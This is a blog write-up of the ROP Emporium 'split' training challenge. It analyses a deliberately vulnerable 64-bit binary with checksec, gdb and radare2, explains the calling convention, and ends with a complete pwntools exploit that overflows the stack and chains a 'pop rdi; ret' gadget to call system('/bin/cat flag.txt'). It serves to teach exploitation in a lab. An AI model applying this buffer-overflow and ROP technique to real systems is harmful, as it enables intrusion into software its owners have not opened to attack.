---
title: "RopEmporium - Split"
date: 2021-12-17T14:27:14Z
draft: false
authors: ["Thuri"]
tags: ["rop", "RopEmporium"]
summary: "The goal of this challenge is to understand how function arguments are passed in 64-bit machine when doing return oriented programming."
toc:
    enable: true
    auto: false

code:
    maxShownLines: 100
---

> The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain

The goal of this challenge is to understand how function arguments are passed in 64-bit machine when doing return oriented programming. The binary can be downloaded from the authors website [ropemporium](https://ropemporium.com).

First we check the binary protections enabled. Only **NX** (Not executable) is enabled on the device according to `checksec` binary utility as shown in the image below.

```bash
vx@archie:split$ checksec --file=split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

For analysis of binary we use `gdb` to analyze the functions present in the binary in order to understand the logic. We disassemble **pwnme** function as shown in the image below.The function looks familiar as for the ret2win function.

```asm
(gdb) disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400810
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x40083c
   0x0000000000400715 <+45>:	mov    eax,0x0
   0x000000000040071a <+50>:	call   0x400570 <printf@plt>
   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt>
   0x0000000000400735 <+77>:	mov    edi,0x40083f
   0x000000000040073a <+82>:	call   0x400550 <puts@plt>
   0x000000000040073f <+87>:	nop
   0x0000000000400740 <+88>:	leave
   0x0000000000400741 <+89>:	ret
End of assembler dump.
(gdb)
```

From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.

![Stack](/ropemporium/stack.png)

Next function is **read** function, which reads for user input from the standard input file descriptor and stores in specified buffer. From disassembled code, we are reading **0x60** bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to stack buffer overflow.

```c
ssize_t read(int fd, void *buf, size_t count);
```

For this challenge we don't have a `ret2win` function which we are to return to. From the disassembly of the binary we have an interesting function called **usefulFunction** responsible for listing the files in the directory when called.

```asm
(gdb) disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret
End of assembler dump.
(gdb) x/s 0x40084a
0x40084a:	"/bin/ls"
(gdb)
```

Goal is to pass a different string to the `system` function instead of **"/bin/ls"**

From the author's hint, we can look for useful hints in the binary using either radare2.

> Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the **"/bin/cat flag.txt"** string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions.

Analyzing binary using `radare2`, we can use **iz** command to look for strings. The goal is to read the flag from the system.

```asm
[0x004005b0]> iz
nth paddr      vaddr      len size section type  string
---------------------------------------------------------------------------------------------
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt

```

We have an important string **"/bin/cat flag.txt"** which will enable us to complete our goal. Now we need pass string to system function as follows **system('/bin/cat flag.txt')**.

For building ropchain, we need to understand the calling conventions of **AMD64 ABI**.The calling convention passes the arguments to the registers in the following order **RDI, RSI, RDX, RCX, R8 and R9**.

Because the system function receives one argument, we need to look for one gadget t that we control **rdi** address.

**What are gadgets?**

Gadgets are sequence of instructions that end with `ret` instruction. Because we want to load a value into rdi register, we look for a pop **pop rdi; ret** instruction in order to pass an argument to `system`.

For searching gadget in radare2/rizin, use **/R** command as shown in the image below.

![](/ropemporium/split_poprdi.png)
Now we need to chain ropchain exploit as shown in the image below.

![ropchain](/ropemporium/popgadget.png)

The goal is to overwrite the return address with the address of **"pop rdi, ret "** and call system function. we need to fill the buffer memory with 32bytes, 8 bytes to overwrite the `rbp` address and 8 bytes to overwrite return address with pop rdi address.

Full exploit of split challenge is;

```python
import pwn

pwn.context.encoding = "latin-1"
pwn.warnings.simplefilter("ignore")
pwn.context.arch = "amd64"

io = pwn.process("./split")

system_addr = pwn.p64(0x400560)   #address of system
pop_rdi_ret = pwn.p64(0x004007c3)  # pop rdi; ret gadget
bin_cat_addr = pwn.p64(0x00601060)  #bin cat flag.txt address

payload = b"A" * 32  #fill the buffer
payload += b"B" *8   # overwrite  rbp
payload += pop_rdi_ret # pop rdi gadget
payload += bin_cat_addr # argument passed to the system function
payload += system_addr   #call system

io.writeafter('>', payload)

pwn.info(io.clean().decode())
```

Running python3 code we get a flag.

![Split flag](/ropemporium/split_flag.png)

> **To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.**
